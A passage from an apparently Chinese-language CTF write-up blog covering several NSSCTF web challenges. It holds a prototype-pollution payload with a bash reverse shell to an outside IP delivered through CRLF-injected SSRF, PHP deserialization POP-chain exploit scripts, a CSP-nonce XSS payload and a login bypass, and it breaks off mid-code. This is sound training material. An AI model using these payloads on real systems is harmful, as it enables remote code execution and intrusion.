<code>_safe.expand</code>，相当于递归merge的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;__tmp1; global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;); __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>接下来构造CRLF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:3000</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Content-Length: 190</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>).replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;\u017b&#x27;</span>).replace(</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\u017d&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\u0127&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\u013e&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\u015c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28958/curl?q=&quot;</span></span><br><span class="line">requests.get(url+payload)</span><br></pre></td></tr></table></figure><p>当时在污染payload处卡了很久！！不知道为啥就是弹不了shell，这个可以弹！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;</span><br></pre></td></tr></table></figure><p>主要思路就是在curl路由下通过CRLF攻击来构造恶意数据包来实现SSRF，用127.0.0.1去访问&#x2F;copy路由，造成ejs模板引擎的污染从而实现RCE！</p><h2 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h2><p>虽然是新生赛，但还可以。有点小综合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道的思路很简单，传入的是$pdata，他直接在源码里new了，只有name是我们可控的，同时我们发现后面又有replace！可以进行字符串逃逸了！！那就很简单了，把$key,$basedata逃逸出来改值就可以！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;N;s:2:&quot;ob&quot;;N;&#125;   53</span><br></pre></td></tr></table></figure><p>这里给出payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pdata</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//逃逸出key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data_replace</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span>=<span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$youwant</span>=<span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$nothing</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$out</span>-&gt;a=<span class="variable">$youwant</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;t=<span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;a=&amp;<span class="variable">$nothing</span>-&gt;b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nothing</span>);</span><br></pre></td></tr></table></figure><p>UUCTF中的__wakeup()中也有一个unserialize()，传参basedata，这里的pop链在上面也有了，要注意的一点就是nothing中的__wakeup()和__unserialize()，这里的wakeup会清空a属性的值，同时我们发现php版本又不符合那个cve，我们又发现destruct中有对b属性的赋值，那么我们通过引用赋值将ab联合起来。这样问题就迎刃而解了。</p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>关于http协议的题，有一点小盲点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://node1.anna.nssctf.cn:28246/ -H “client-ip:127.0.0.1” -H “Referer:pornhub.com” -H “User-Agent:Chrome” -H “Via:Clash.win”</span><br></pre></td></tr></table></figure><h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><p>存在CSP策略，需要绕过，抓包看看</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png" alt="image-20241213210502761"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-29de6fde0db5686d&#x27;</span><br></pre></td></tr></table></figure><p>关键点如上，允许nonce-29de6fde0db5686d</p><p>那么构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28378/?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(flag)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4f323f4-020d-4821-bc1a-efd73ce09f89&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2020-greatphp"><a href="#极客大挑战-2020-greatphp" class="headerlink" title="[极客大挑战 2020]greatphp"></a>[极客大挑战 2020]greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$str</span>=~(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">1</span>);<span class="variable">$y</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;lover=<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为啥不能`whoami&#96;这样输出，奇怪</p><p>那就只能include了，但是引号被过滤，两次取反来绕过。</p><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p>二次注入加sqlite注入，不是很熟悉</p><p>二次注入的步骤，先注册一个admin’–+进去，发现有个修改密码，修改密码处将admin’–+放进去，那么改的就是admin的密码，直接拿下admin，进去sqlite注入就行，这里用python脚本或者sqlmap都是可以的！</p><h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>f12网页源码这种存在这样的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;ADMIN&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">passwd</span> === <span class="string">&#x27;admin123&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">// 登录成功，设置 session</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里需要注意一点，ctrl+u或者右键查看网页源代码是看不到这段的。</p><p>这里采用nodejs的大小写特性来绕过，nodejs笔记里有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admın</span><br></pre></td></tr></table></figure><p>登陆进去后是一个calc界面，同样f12查看源代码获取源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//截取</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//去空</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的同学过滤了一些比较危险的东西</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title 